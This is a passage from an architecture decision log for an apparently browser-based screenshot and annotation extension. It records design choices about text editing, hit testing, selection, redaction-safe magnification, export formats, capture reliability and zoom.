another. The Fill button carries a slash it is meant to lift once a fill is chosen,
and it never lifted. Both were reported by the maintainer, not by the suite.

**Why the suite missed it.** The end-to-end check read `element.hidden` to decide
which glyph was showing: the same property the code was writing. Code and test
agreed with each other and neither of them agreed with the browser. That is the
exact failure D23 exists to prevent, arriving through a door D23 had not been
pointed at.

**Decision.** Three parts.

1. One helper, `showGlyph(node, on)`, sets and removes the attribute. Nothing in
   `src/ui/` assigns `.hidden` on an SVG element or on a shape inside one.
2. CSS says what `hidden` means for SVG, because the user agent stylesheet does
   not: `#toolbar svg[hidden], #toolbar svg [hidden] { display: none; }`.
3. The check reads computed `display`, never the property the code writes.

**Consequences.** HTML elements keep using `.hidden`, which is correct and
idiomatic for them. The rule is about the boundary, not about the idiom.

## D38: A container that holds a popover may not hide its overflow

**Date.** 2026-09-09.

**Context.** The Shapes and Text groups are split buttons, and D34's presentation
work moved their border from the two halves onto the group so they stopped being
the only controls in the row wearing a box around their chevron. Making two square
buttons sit inside one rounded border was done with `overflow: hidden`, which is
the obvious way to do it.

Those groups also contain their own popover. `overflow: hidden` clipped it. Both
menus were laid out at the right size, in the right place, and painted nowhere:
present in the DOM, correct in every property either the code or the tests read,
and invisible on screen. Neither chevron did anything.

**Why every check passed.** The tests that use those two menus reach into them by
id, `#pop-shapes [data-tool="rect"]`, because that is the reliable way to pick a
specific item. Nothing ever opened them the way a person does and then asked
whether anything was there.

**Decision.** The corners are rounded on each half instead of clipped on the group,
so the group's overflow stays visible. And a new check opens every chevron in the
toolbar, then hit tests the centre of the menu it claims to have opened with
`document.elementFromPoint`. If what is painted there is not the menu, the menu is
not there.

**The general rule.** A popover is positioned outside its container by definition.
Any container that holds one has to let its overflow show, so `overflow: hidden` on
an ancestor of a `.pop` is a bug even when it looks like styling. Clip the children
instead, or move the popover out.

## D39: Text is a first class shape, not a label you get one attempt at

**Date.** 2026-09-09. Taken after the maintainer reported, in three separate
messages, that the text tool looked unfinished. It was.

**Context.** Text could be placed, and after that almost nothing. It could not be
re-edited, so changing a word meant deleting the shape and typing it again. It had
no resize handles, because `handlesFor` returned an empty set for both point
tools and only one of them deserved that. The entry box was a single line
`<input>`, which is why D21 held back alignment. And its colour came from the
Border control, which is defensible and was written down nowhere a user would look.

Every one of those is defensible on its own. Together they made text the one shape
in the editor that behaves like a label rather than an object, in a product whose
whole editing model is that shapes stay live.

**Decision.** Four changes, taken together because they are the same two functions.

1. **Multi-line entry.** The box is a `textarea` that grows with what is typed.
2. **Double click to re-edit.** On the select tool, a text shape reopens with its
   own words in the box. Committing replaces it, keeping its id, so it is one undo
   step and not a delete followed by an add. Emptying it deletes the shape, which
   is what emptying a text box means everywhere else.
3. **Corner handles that scale the type.** Text is a point and a font size, not a
   box, so a corner drag sets one number: the point size, from whichever axis moved
   further. Stretching a glyph is something image editors do to bitmaps and type
   editors never do to type. The opposite corner stays put.
4. **Four alignments and a colour of its own**, which is what D21 was waiting for.

**What Enter now means.** A newline. It used to commit, and it cannot do both. The
box is finished by clicking away or by pressing Escape, which is the convention in
every canvas editor that has multi-line text, for the plain reason that Enter is no
longer available to do it. The inspector says so, because a key changing meaning is
exactly the kind of thing a person should not have to discover.

**Why Escape finishes rather than abandons.** Nothing is lost by it: a commit is one
undo step, and an empty box commits nothing, so the two things a cancel would have
protected are both already covered.

**Why justify was included.** It was in the reference the maintainer worked from,
and it is the one alignment that is real work rather than an offset: the words of
every line except the last are spread to the width of the widest line. A text block
drawn straight onto a screenshot has no column to justify to except itself, and the
last line is set flush left exactly as it is in print.

**Why the text colour is separate from the stroke colour.** An arrow pointing at a
thing and a caption naming it are rarely wanted in the same colour. It defaults to
the stroke colour, so nothing changes for anyone who never opens the control, and
the inspector carries the ten quick colours and the system picker rather than the
sixty step grid: the panel already holds a family, a size, three type toggles and
four alignments, and sixty swatches in it would bury all of them.

**Found on the way.** A move or resize drag pushed an undo step even when nothing
moved, and selecting a shape is a press and a release on it, so every click on the
canvas was one. Click three shapes and the next three presses of Cmd+Z appear to do
nothing. `endDrag` now compares the shape before and after and pushes nothing if it
is unchanged. It surfaced because an end to end check asserted how many undo steps
a piece of work should cost, which is a more useful thing to assert than that undo
merely works.

## D40: The text colour is a well beside the font, not a section below it

**Date.** 2026-09-09.

**Context.** The text colour shipped as its own block at the bottom of the
inspector: a heading, ten swatches and a hex field, stacked under the alignment
row. It worked and it was in the wrong place. Colour is a property of the type,
like the family and the size, and it belongs on the same row as them rather than
in a section of its own that pushes the panel taller than the thing it describes.

**Decision.** A colour well to the right of the font menu, which opens the same
palette the border and fill controls open: quick colours, the tint grid, the
system picker and a hex field. `buildPalettes` already took a palette name, so the
text palette is the same code and the same markup shape as the other two rather
than a third variant of a colour picker.

**Consequences.** A popover now lives inside another popover, and two things had
to learn about that.

`closePopovers(except)` closed every popover but one, which meant opening the text
palette closed the inspector containing it. It now skips any popover that contains
the one being opened.

The end to end chevron check opens every chevron and hit tests the menu it claims
to have opened. A nested trigger is unreachable, and its menu unpainted, until the
popover holding it is open, so the check now walks up and opens every enclosing
popover first. It also asserts that clicking away closes the nested one, which is
the failure mode a nested popover actually has.

## D41: Arrow and line are reconciled, not merely stored twice

**Date.** 2026-09-09. Reported by the maintainer as plain common sense, which it is.

**Context.** Arrow and line are one shape drawn two ways, and the toolbar records
that fact in two places: the tool, which is `arrow` or `line`, and the arrowheads
in the stroke style, which is `none`, `start`, `end` or `both`. Nothing kept them
in step. Draw an arrow, take its head off from the stroke panel, draw some text,
then pick Arrow again from the Shapes menu and draw: you get a line. The tool said
arrow, the ends still said none, and the ends won.

Picking Arrow from the Shapes menu is the clearest statement the interface offers
about what the reader wants, and it was being ignored in favour of a setting they
had last touched several actions ago.

**Decision.** Whichever of the two was touched last wins, and the other follows.

- Choosing **Arrow** puts a head back on if there is none. If the ends are already
  `start` or `both` it leaves them alone: that is still an arrow, and it is a
  preference set on purpose.
- Choosing **Line** takes the heads off.
- Taking the heads off from the stroke panel makes the tool **Line**.
- Putting one back makes the tool **Arrow**.

Both halves are saved together, so the next capture cannot open on the pair that
disagreed.

**Why not collapse them into one control.** Because they are two useful questions.
"Which shape am I drawing" and "which ends carry a head" are asked at different
moments and from different parts of the toolbar, and an arrow with a head at both
ends is a thing people want. Keeping both and reconciling them costs six lines;
removing one would cost a feature.

**Where it lives.** `chooseTool` in `src/ui/editor.js` is the public entry, and
`applyTool` stays private for the editor's own moves, such as handing back to the
selection tool after a shape is finished. That distinction matters: an internal
tool change must not restyle anything.

## D42: The editor says what is under the pointer

**Date.** 2026-09-09.

**Context.** A canvas has no hover states. Every shape on the image looked exactly
as clickable as the empty pixels beside it, the cursor changed only when the tool
changed, and `pointermove` returned immediately unless a drag was running. On a
screenshot dense with annotations, working out what a click would pick up meant
clicking and finding out.

**Decision.** Four answers, all before the click rather than after it.

1. **A handle shows the axis it travels on.** `nwse-resize` on the north west and
   south east corners, `nesw-resize` on the other two. The map is shared with the
   crop region, which uses the same handle ids and means the same thing by them.
   The two endpoints of a line fall back to `move`, because an endpoint is not
   constrained to an axis: it goes wherever it is put.
2. **The body of a shape shows `move`.**
3. **Empty canvas shows the tool's own cursor**, and under a drawing tool the
   crosshair stays: a drag there draws a new shape whatever is underneath, so
   suggesting otherwise would be a lie.
4. **The shape under the pointer is outlined**, in a solid hairline rather than
   the selection's dashed box with handles, so the two are never confused.

**Why `move` and not the open hand.** The maintainer asked for a hand. The hand
means "drag the view", which is what it will have to mean here the day the canvas
can be panned (F6 in the roadmap), and a cursor that means two things means
neither. `move`, the four headed arrow, is the one that says "this object comes
with you", which is the thing being promised. One line changes it if the call is
judged wrong.

**Also.** Escape now abandons a drag in progress and puts the shape back where it
started. A move or a resize is only committed on pointerup, so until then the state
before it is still in hand; the only previous exit from a misjudged drag was to
finish it and then undo. Escape falls through to dropping the selection when there
is no drag to cancel, so it keeps doing what it did.

**Cost.** The hover outline repaints, so it repaints only when the answer changes
rather than on every `pointermove`. A pointer leaving the canvas clears it, because
an outline left behind would claim something is under a pointer that has gone.

**Still open from F27.** Alt drag to duplicate, a right click menu carrying the z
order, arrow key nudging (which is also the first step of L14), and shortcut keys
in every tooltip. They are separate pieces of work rather than part of this one.


## D43: A shape is described once, as path operations, and read twice

**A shape has to be drawn on a canvas, hit tested against a pointer, and outlined
when it is selected.** Write those three separately and they drift. That is not a
hypothetical: it is how a rhombus ends up selectable by a click in the empty
corner of its bounding box, which is a corner the shape does not occupy and the
user can see it does not occupy.

So each shape is described once, in `src/lib/geometry.js`, as a list of path
operations: move, line, elliptical arc, close. Exactly two things read
that list. `src/ui/editor.js` replays it onto a 2D context, so a curve is a real
curve on screen and in the exported file. `flatten()` turns it into a polygon, so
containment is point in polygon and slack is distance to polygon, with no canvas
anywhere near it, which is what makes the file unit testable.

**The alternative was sampling everything into polygons and drawing those too.**
It is simpler and it is wrong: an ellipse drawn as sixty four segments is visibly
faceted at a large size, and the export is a file someone keeps.

**Decorations are separate from the outline.** The seam across a cylinder's lid
and the handle on a loupe are drawn and never hit tested, because a pointer beside
a loupe's handle is not inside the loupe.

**Canvas angles run clockwise with y pointing down**, so PI/2 is the bottom of an
ellipse and 3PI/2 is the top. Getting that backwards draws a cylinder with no lid.
This file has made that mistake once and there is a test for it.

## D44: Hit testing takes a required tolerance, and it has no default

`hits(shape, point, tolerance)` will not supply a tolerance for you. Passing
`undefined` compares against NaN, which is false everywhere, so a caller that
forgets selects nothing.

**That is deliberate, and it is the safer failure.** Selecting nothing is obvious
and gets fixed. Selecting slightly wrongly is not obvious and does not.

The reason there is no safe default is D19. Chrome is divided by the screen scale
because a fixed count of image pixels is a different distance under the pointer at
every display scale. Four image pixels of slack is comfortable at 100% and less
than half a screen pixel on a capture shown at 12%, which is the zoom a long page
is actually viewed at, and which is the case this extension exists for. A default
would be correct in the one situation nobody has trouble with.

`handlesFor(shape, minEdge)` takes its threshold the same way and for the same
reason: whether a shape is too small to carry eight handles is a fact about the
screen, not about the image.

## D45: A selection is a list, and the single case is a convenience over it

`present.selection` is a list of ids. A selection of one is the common case of a
selection of several, not a different kind of thing.

`selectedShape(doc)` returns the one selected shape and null when it is not
exactly one. Most callers genuinely mean "the one thing being edited": the resize
handles, the text box, the style swatches. Returning null for a set is what let
those keep working unchanged instead of each growing a length check, and it kept
the diff proportional to the behaviour change.

**A marquee selects what it touches, not what it encloses.** Requiring full
enclosure means that clipping the edge of the thing you dragged around selects
nothing, and people reliably clip the edge.

**A marquee with no area selects nothing at all.** A click is not a sweep. Without
that guard, a click anywhere inside a rhombus's bounding box selects it through
the marquee, which is bounding box selection returning through the back door the
day after D43 removed it.

**No union box.** A multi-selection is a dashed outline on each member, with
handles only when exactly one is selected. A union box would have no handles, so
it is not a drag target, and its extents are readable from the members anyway.
Dashed means "in the selection" whether that is one shape or nine, so a
multi-selection needs nothing new to be read.

**No group resize.** Scaling a mixed set means scaling type, stroke widths and
counter radii at once, and a group scale that silently changes a stroke width is a
different feature with its own decisions.

**For a mixed selection the toolbar shows the value every member agrees on, and
falls back to the pending style where they differ.** Never blank and never an
indeterminate state, because the swatch is also the control that sets the value,
and a control showing nothing is a control whose effect you cannot predict.

## D46: `colour` is the stroke on every shape, and `ink` is the glyphs

For every shape `colour` is the stroke. For text it used to be the glyphs, while
the Border palette wrote `colour` on whatever was selected. Selecting a caption
and picking a border colour silently changed the text colour, which nobody asked
for and which had no undo that made sense.

Giving text a frame made that untenable, so `colour` now means the stroke without
exception and the glyph colour has moved to `ink`.

**Not `textColour`.** That is already a settings key, and the same name meaning a
stored setting at one layer and a shape property at another is exactly how a
silent seeding bug gets written. This repository already carries that trap once:
`TEXT_FAMILIES` is an array in `settings.js` and an object in `edit.js`.

**A frame is a colour, not a switch.** It is on when it has one and off when it
does not, which is how a fill already works, and the button already carries a
slash glyph for the off state. Padding and corner radius are derived from the type
size, because a framed label has to look right at 12pt and at 96pt and a padding
slider is a control almost nobody moves.

**Bounds had to split.** A framed caption is visibly larger than its words, and
the selection outline, the hover outline, hit testing and the export all read
`boundsOf`, so `boundsOf` includes the padding. But `resizeText` solves for a new
type size from the ratio between two boxes, and the padding is a function of the
size being solved for, so it reads `glyphBoxOf` instead. Feeding it the padded box
makes the first frame of a drag wrong.

## D47: A magnifier may not undo a redaction

The loupe magnifies what is under it. Sampling the original capture would
reproduce the hidden pixels inside the ring, at twice the size, in the exported
file, and hand back exactly the thing the person was trying to destroy.

It samples a cached redacted base: the capture with every redaction already burned
in. Cached because it is rebuilt from the full size capture and a loupe is redrawn
on every frame of a drag; keyed on the redaction rectangles, so moving, resizing,
adding, deleting or undoing a redaction invalidates it and nothing else does. The
redaction is burned in through the same code path that draws it on screen, so the
two can never be computed slightly differently.

**The test for this took seven attempts before it could fail.** Every earlier
version passed against a loupe deliberately wired to the raw capture: one measured
the selection chrome around the new shape, one measured the hover outline under
the resting pointer, one derived the loupe's radius from a changed-pixel box twice
the size of the loupe so most samples fell outside it, and one sampled blank page,
which pixelates to itself and makes both candidate sources identical.

The version that ships places the loupe where the redaction actually changed
pixels, samples only inside the ring, and scores only the points where the two
candidate sources disagree. It is verified by mutation in both directions.

**The general lesson, which is bigger than the loupe.** A check that has never
been observed to fail is not a check. Every guarantee in this repository that
would be expensive to break should be broken on purpose once, to watch the suite
catch it.

## D48: How the project would accept money, if it accepts money at all

**Date.** 2026-09-10. **Status.** Recorded for F42, not yet decided. Blocked on
whether [GOVERNANCE.md](../GOVERNANCE.md) is amended, see the F42 entry in
[ROADMAP.md](ROADMAP.md).

**Context.** The maintainer asked what the options are. This records them once so
the answer does not have to be re-derived, and so the reasoning is visible to
anyone reading the repository rather than living in a chat log.

**The constraint that eliminates most of the question.** Every platform below is a
URL. The extension opens it in a tab with `chrome.tabs.create` and makes no request
itself, exactly as F25 hands off an upload. So the choice is not a technical one and
cannot break rule 1. It is a question of fees, of who has to trust whom, and of what
the presence of the link says about the project.

| Platform | Recurring | One off | Fee | The reason to pick it |
|---|---|---|---|---|
| **GitHub Sponsors** | yes | yes | none taken by GitHub, payment processing only | The repository is the shop window. `.github/FUNDING.yml` puts a Sponsor button at the top of the page with no code and no account for the visitor to create. If only one is chosen, this is the one |
| **Open Collective** | yes | yes | fiscal host fee, commonly 5 to 10 per cent | **The one that fits this project.** Every payment in and every expense out is published. A project whose entire argument is "do not take our word for it, check" should not have a private bank balance attached to it. Needs a fiscal host, which is the setup cost |
| **Liberapay** | yes | no | none, payment processing only | Non profit, open source itself, recurring only. Small audience, but the values match and it costs nothing to list |
| **Ko-fi** | yes | yes | none on one off donations | The lowest friction way for someone to give five dollars once without making an account |
| **Buy Me a Coffee** | yes | yes | around 5 per cent | Same shape as Ko-fi, better known, takes a cut. Pick one of the two, not both |
| **Patreon** | yes | no | 8 to 12 per cent plus processing | Built for tiered membership with rewards. Rewards are exactly what F42 must never offer, so this is the wrong shape |
| **Polar** | yes | yes | around 4 per cent | Developer focused, newer, handles merchant of record duties including sales tax |
| **PayPal.me or a Stripe payment link** | no | yes | processing only | No platform in the middle. Also no page explaining what the money is for, which is most of the value |
| **thanks.dev, Tidelift** | yes | no | varies | Both pay maintainers of **dependencies**. This project has zero dependencies and is nobody's dependency, so neither applies |
| **A crypto wallet address** | no | yes | none | **Refused.** It invites a category of correspondence this project does not want, it cannot be reversed when someone sends the wrong thing, and on a repository selling caution it reads as the opposite |

**For a maintainer paid in India specifically.** GitHub Sponsors pays out through
Stripe Connect, which supports India. Open Collective needs a fiscal host willing to
take an Indian maintainer, which is the item to check before committing to it. For
domestic donors a UPI handle is by far the lowest friction, and Razorpay will issue
a payment page for one, but a UPI handle alone has the same weakness as PayPal.me:
no page saying what it funds.

**Recommendation, if F42 goes ahead.** GitHub Sponsors for the repository, Ko-fi
for the one off case, and Open Collective if and only if the transparency is
actually wanted, because a public ledger that nobody maintains is worse than no
ledger. Three links is already one more than most people will read; five is a
donation page, and this project is not asking for one.

**What is refused in every case.** No feature gated, delayed or degraded for
anyone who does not pay. No reward for paying. No count of donors displayed inside
the extension. The moment money buys anything, the non transfer covenant is a
promise made by someone with an incentive to break it.

## D49: The paint order is reached by right clicking, not by four more buttons

**2026-09-10.** Shapes are drawn in array order, so the last one drawn is the one
on top, and until now there was no way to change that. A box drawn over a
highlighter covered it permanently and the only repair was to delete both and draw
them again. ROADMAP F27 had carried "a right click menu carrying the z order that
is unreachable today" since the toolbar was regrouped.

**The menu is a right click on the canvas.** Four toolbar buttons were the
alternative, and they were rejected: the toolbar already carries sixty-eight
controls behind sixteen buttons, and reordering is something a person reaches for
perhaps once in twenty captures. A right click is also where people look for it.

Three things were decided along the way, and each is a rule the code follows:

- **A right click on empty canvas keeps Chrome's own menu.** Chrome offers "Save
  image as" and "Copy image" on a canvas. Replacing that with our menu, every item
  of it greyed out because nothing is selected, would take something away and give
  nothing back. `menuTarget()` returns false when nothing is under the pointer and
  the handler never calls `preventDefault`.
- **A right click on an unselected shape selects it; on one already in a selection
  it changes nothing.** That is the convention everywhere, and it is what lets the
  menu act on a whole selection.
- **Items are disabled, not hidden.** A shape already at the front should show that
  the option exists and does not apply. Hiding it would make the menu a different
  height each time it opens, under a pointer that has not moved.

**The keys are `[` and `]` for one step, and the platform accelerator with either
for all the way.** They are what the drawing tools have used for decades, and every
one of them is named in the menu, so pressing one is something learned by having
used the menu once.

`reorderShapes` in `src/lib/edit.js` is pure and unit tested. A whole selection
moves as a block and keeps its own internal order, which is the part a naive
implementation gets wrong in two distinct ways: walking the list in the wrong
direction carries a shape to the front in a single press, and failing to check the
neighbour lets one member of a selection leapfrog another. Both are covered, and
both were confirmed by mutation.

## D50: The frame block is a second way to write the same two properties, and that is the point

**2026-09-10, reversing a decision made a day earlier.**

A caption over a busy screenshot is often unreadable, and a frame around it or a
plate behind it is the repair. Both were already possible: on a text shape,
`colour` is the frame and `fill` is the plate (D46), so the Border colour and Fill
wells have always written them with a caption selected.

That shipped with **a line of copy in the text inspector saying so**, on the
argument that a second control writing a property from a different place is
duplication, and that one hint is cheaper than a second border colour control.

**The argument was correct about the code and wrong about the reader.** Nobody
reads a hint to learn that an unrelated control changes meaning while a particular
kind of shape is selected. A frame nobody can find is a frame that does not exist,
and the hint was standing in for a control rather than replacing one.

The text inspector now carries a **Frame** block: a switch, a colour well, a
thickness, and a switch for the plate. It writes `colour`, `width` and `fill` on the
text shape, which is exactly what Border colour, Stroke style and Fill write, so the
four controls cannot disagree: all of them read the selected shape.

Two things stayed as they were. **The padding and the corner radius are still
derived from the type size** and are still not controls, because a framed label has
to look right at 12pt and at 96pt and a padding slider is a control almost nobody
moves. And **off is still `null`**, not a separate flag, which is how a fill already
works everywhere in this editor.

One thing is new. **The frame keeps its own thickness**, `textFrameWidth`, separate
from the stroke width that arrows and boxes share. A 4px rule is a good arrow and a
heavy frame around 24pt type, and nobody setting a frame to 2 expects every arrow
they draw next to become thin. The property on the shape is still `width`: only the
value a *new* text shape starts with is kept apart.

## D51: Rounded box and Stadium are tool presets, not new kinds of shape

**2026-09-10, after user feedback.** The corner radius is a property of the Box
rather than three separate tools. That is still true, and the reasoning still holds:
at nineteen pixels a square corner and a small radius are the same icon, so three
cells in the Shapes popover would have looked like one cell three times.

But readers asked for the rounded rectangle and the stadium as shapes they could
see, and they were right about the cost they were paying. Reaching a rounded box
meant opening the Shapes popover for the Box and then the Stroke style popover for
the corner, which is two popovers to draw one shape, and the second one is only
discoverable by someone who already knows the property exists.

**They are entries in the Shapes popover that pick the Box tool and set its corner
in one click.** `TOOL_PRESETS` in `src/lib/edit.js` maps the tool name to a kind and
a radius, and `kindOfTool()` is what everything downstream reads. So:

- The drawn shape is still `kind: 'rect'`. No saved shape gained a new kind, no
  migration exists, and every capture made before today still renders identically.
- The corner row in the Stroke style popover still reads and writes them, so the
  preset is a starting value and never a cage. Setting a Rounded box back to square
  is one click, and it stays square.
- The model has fourteen shape *tools* and twelve shape *kinds*, and the difference
  is written down in one place rather than inferred.

The alternative was two more kinds in `SHAPE_GEOMETRY` that render exactly like a
rect. That would have put three indistinguishable rectangles in the model to save
one line of mapping, and it is the kind of duplication that is invisible until
something has to switch on kind.

## D52: One description of each output format, and a null blob is an error

**2026-09-10.** Three lists described the output formats: `DOWNLOAD_FORMATS` in
`settings.js` decided what a remembered preference could be, `EXTENSIONS` in
`result.js` decided what the file was called, and the markup decided what the
download menu offered. Adding WebP meant editing all three.

**A format present in two of them and missing from the third fails silently, in
both directions.** A menu entry `sanitise()` does not know about is thrown away
on every reload, so the format never sticks and nothing says why. A format in
`DOWNLOAD_FORMATS` with no menu row is a preference that can be stored and never
chosen. Neither produces an error.

`src/lib/encode.js` now holds the table, `settings.js` re-exports the list from
it the way it already re-exports the shape lists, and an invariant test checks
that the menu names exactly the formats the table declares **and** describes each
one with the same words. There is one remaining hand-maintained copy, the markup,
and the test is what makes it safe.

**And `encodeOrThrow`.** `canvas.toBlob` reports failure by handing its callback
`null`. It does not throw and it does not reject, so wrapping it in
`new Promise((r) => canvas.toBlob(r, ...))`, which is what the code did, resolved
`null` and passed it to `URL.createObjectURL`. The user got a download of nothing,
or no download at all, and the console said nothing.

This is not theoretical. `toBlob` returns null when the canvas is larger than the
encoder can hold, which a full page capture reaches sooner than anything else
this extension does, and when the browser does not recognise the mime type. The
failing case is unit tested with a fake canvas, because a real one has to be
enormous before it fails, and mutation confirms the test can fail.

## D53: The port protocol is versioned, and only one direction is checked

**2026-09-10.** Chrome updates an extension by replacing the service worker and
leaving the pages it opened running exactly as they were. A result tab opened
five minutes ago is still executing the old code, and the new worker posts to it
regardless.

Today nothing goes wrong, because the messages have the same shape. **The moment
the shape changes it fails in the worst available way: silently.** ROADMAP F10
changes it, by splitting a long capture into parts, which is why this is a
prerequisite rather than a nicety. An old tab reading a part message it does not
understand shows a progress bar that never fills and reports nothing.

`PROTOCOL_VERSION` goes on every message the worker sends, and both pages check
what they receive. One number turns a hang into a sentence naming the cause and
the remedy.

**Only the worker can be newer than the page**, so only that direction needs
catching. A page's code is loaded from the extension package when its tab opens,
and any worker started afterwards comes from the same package or a later one,
never an earlier one. Checking the other direction as well would be code whose
failing case cannot occur.

The pages do stamp what they send, and the worker refuses a command it does not
recognise. There is exactly one command, Finish now, and refusing it means the
capture runs to the end rather than stopping early, which costs nobody any work.

The check is exercised by `node test/e2e/run.mjs --stale`, which points the
worker at a protocol module claiming a later version while the pages read the
real one. That is the only way to make the two ends disagree, because they
otherwise read the same file.

## D54: The file size is the feature. The quality slider is how you move it

**2026-09-10.** ROADMAP F21 was "a quality slider for JPEG and WebP", and it was
approved in that shape. The maintainer sent it back with the reason:

> people generally play around with quality and compression only to save on file
> size. Adjusting file quality without feedback on how it affects file size is
> not very useful.

That is correct, and it inverts the feature. Nobody moves a quality slider
because they want quality 78. They move it because the file is too big to attach,
and a control that cannot answer the only question being asked is a control that
gets dragged at random until it looks about right.

**So every row in the download menu carries what that format would actually
cost**, and the two lossy rows re-measure as the slider moves.

**The sizes are real, not estimated.** The obvious cheap version encodes a
downscaled copy and multiplies. It does not work: a compressed size does not
scale with pixel count, so the number would be confidently wrong, and a wrong
number is worse than no number. Each row is the capture encoded for that format
at the quality currently set.

That costs real work, so it is spent only where it is affordable:

- **Only while the menu is open.** Nothing is measured for a menu nobody has
  opened, and an open measurement stops the moment it closes.
- **One format at a time, cheapest first, with a yield between.** JPEG and WebP
  are the two the slider moves and they answer first; the PDF, which has to
  deflate the whole image, arrives a moment later. The interface stays live
  throughout.
- **Cached against the quality that produced it.** A lossless format is measured
  once and never again until the picture changes, so dragging the slider never
  re-measures PNG or PDF.

**Invalidation is by a stamp of the image, not by a count of notifications**, and
that distinction is the whole reason this works. The first version bumped a
generation counter from `onChange` and measured nothing at all, ever:
`render()` ends by notifying, `flatten()` renders twice and `restoreSelection()`
renders again, so every measurement invalidated itself before its own encoder
finished. Selection, hover and the crop bar repaint too, and not one of them
changes a pixel of what a saved file would contain. The stamp moves when the
history commits, when a shape is added or removed, or when the crop changes.

The slider itself is capped below at 40. Under that a screenshot is unreadable,
and a control that can be dragged to a value nobody would keep wastes the drag.

## D55: The confirmation answers at the button, and does not grow to do it

**2026-09-10, ROADMAP F26.** Copying and saving both said so in the status line,
at the far end of a row that also carries a filename and a pixel count, in the
same muted grey as both. "Did that work" is the one question a capture tool has
to answer without being asked twice, and it was being answered where nobody was
looking.

The alternative considered and rejected was a toast: a floating panel that slides
in, says it, and fades. It is what most applications do and it is impossible to
miss. It is also a new floating surface that has to be positioned, dismissed,
kept clear of the toolbar, and kept out of an export, for a sentence that already
has somewhere to live.

**The button that was pressed answers instead.** Its glyph becomes a tick, it
takes a green ground for two seconds, and its accessible name becomes the
sentence, so this is an answer for a screen reader and not only a colour. The
status line still carries the sentence, briefly on the same green, so it reads as
the record rather than as one more grey label.

**It does not grow to fit a word.** Copy, Download and Upload are fixed-width
icon buttons, and widening one for two seconds would shove everything to its
right sideways and back again. A quieter answer in place beats a louder one that
moves the furniture, which is the same call made for the paint order menu's
disabled items (D49) and for the corner row that greys out rather than hiding
(D18).

The green is its own token pair rather than a tint mixed with transparent. The
rendered-page audit reads computed colours, and a translucent ground resolves to
whatever is behind it, which is how the first attempt measured green on green at
1:1 and was right to fail.

## D56: A screenful that repeats the one before it is photographed again

`chrome.tabs.captureVisibleTab` does not photograph the page. It hands back the
last frame the compositor presented. Those are the same thing only while the
page is producing frames, and a capture spends its first step making sure it is
not: `PREPARE_CSS` pauses every animation and every transition, and F2 pauses
anything playing. On a prepared page the scroll is the only thing left that
produces a frame at all.

Lose that race and the screenful that arrives is the previous one. Nothing
downstream can tell. The tile is the right size, it is placed at the right
offset because `scrollAndSettle` reported the position the page really did reach,
and it is a photograph of the right page. The output repeats one screenful and
loses the one that should have been there, and says nothing.

This was observed on a real news page on 2026-09-10: the top of the article
appeared twice, and the second copy still carried the fixed sign-in banner that
the extension hides immediately after the first screenful, which is what proved
the second photograph was taken before that CSS existed rather than after it.

**Two changes, because prevention and repair answer different halves.**

*Prevention.* `scrollAndSettle` ended on a single `requestAnimationFrame`. That
callback runs **before** the frame it belongs to is drawn, so it proves the page
is animating and nothing more. It now waits for a second one, which cannot run
until the first frame has actually been produced.

*Repair.* A screenful identical to the one before it, taken at a scroll position
that genuinely differs, is photographed again, after a forced repaint: one pixel
away and back, which is the smallest change that cannot be folded away, since the
scroll offset really does change twice and the page ends where it started. Three
attempts, then the screenful is kept.

**Why it repairs rather than fails.** Two screenfuls can be identical honestly,
on a long blank stretch of a page. There is no way to tell that apart from a
stale frame by looking at the pixels, so the cheap answer is to try again: a
stretch that really is identical simply arrives identical again and is kept, at
a cost of one extra capture. Refusing the capture instead would turn a common,
harmless case into a failure.

**Why not simply wait longer.** Waiting is a guess about a page that by then is
producing no frames at all. A page with nothing moving on it can sit on the same
presented frame indefinitely, so a longer delay makes the race rarer without
closing it, and slows every capture on every page to do it.

**How it is proved.** The race lives inside Chrome's compositor and cannot be
provoked from outside, so `node test/e2e/run.mjs --frozen` makes the worker's own
capture step serve the previous frame once, the same staging trick `--stale` uses
for the port protocol. An unrepaired build fails the fixture check with the
sticky header and the fixed bar each appearing twice, which is exactly what the
real page did.

## D58: Zoom is a width, not a scroll container, and the pane is a schematic

Two halves of F6, and the interesting decision is in each.

**Zoom sets the canvas's CSS width and nothing else.** The page keeps doing the
scrolling. The obvious way to build a zoom is to put the canvas in its own
scrolling box, and it breaks two things at once: `toImage()` converts every
pointer position through `canvas.getBoundingClientRect()`, and `startTextEntry`
places the inline text box from that same box plus `window.scrollX/Y`. That is
[LIMITATIONS.md](LIMITATIONS.md) L17, written down as blocking for this feature
long before it was built. Setting a width means both of those go on being true
without a line changing, and the handles stay the right size on screen because
`screenScale()` was already the ratio between the image and the box it is drawn
in.

**100% means one pixel of the capture to one pixel of the screen**, which is what
it means in an image viewer and is the size at which a redaction can be judged.
It is not the size the page was: a retina capture holds two device pixels per CSS
pixel, so the page at its own size is 50% here.

**A fit is a rule, not a number.** "Fit width" stays fitted when the window is
resized, which a percentage worked out once would not.

**`applyZoom` only redraws when the width it wants is not the width already set.**
`render()` ends by calling `notify()`, so a redraw from inside a change handler
calls the zoom again. Without the guard the loop stops only because the numbers
stop changing, which is not a thing to rely on. Same trap as D54.

**The pane is a schematic, not a thumbnail.** The first design was a downscaled
picture of the capture with a viewport rectangle on it, and the maintainer turned
it down as too much: what they asked for instead was the page the progress popup
already draws while it is capturing, with a marker on it. That is the better idea
for three reasons. A reader who has seen the capture running recognises it. It
answers the only question it is being asked, which is where in the page am I, and
a thumbnail of a 12,000 pixel capture answers that no better at 52 pixels wide.
And it costs no drawing at all: nothing is rendered, resampled or cached, on a
panel that has to keep up with scrolling.

**It hides when the whole capture is on screen**, because then the marker covers
the sheet and says nothing.

**It is a control, so it can be switched off.** That meant widening
`applyHiddenButtons` from the toolbar to the document, since the pane is fixed to
the window rather than sitting in the toolbar, and a query scoped to the toolbar
would have quietly exempted the one control that is not in it. The pane owns its
own `hidden` attribute, because it also takes itself away when there is nothing
to navigate, so the switch is recorded in a data attribute instead and the two
cannot fight.

**Zoom is not remembered between captures.** Every capture is a different size,
so a percentage carried over from the last one is meaningless, and a fit is what
the old `max-width: 100%` rule already did. A capture opens exactly where it
always has.

## D57: One description of the colour popovers, and opacity in all of them

Three requests from the maintainer, on the same day, that turned out to be one
piece of work.

**The switches go.** The Frame block carried an on/off switch beside a colour
well, and a second switch reading "Plate behind the words". Both described
something the control next to them could already say. A frame is on when it has a
colour, which is exactly what "no fill" already means and what the slashed well
already shows, so the switch was a second way to say a thing the well was
saying. `isFramedText` had said so in a comment since the day it was written.

**The plate is a quantity, not a yes.** A plate exists to make words readable
over a busy screenshot, and whether it works is a matter of how solid it is: too
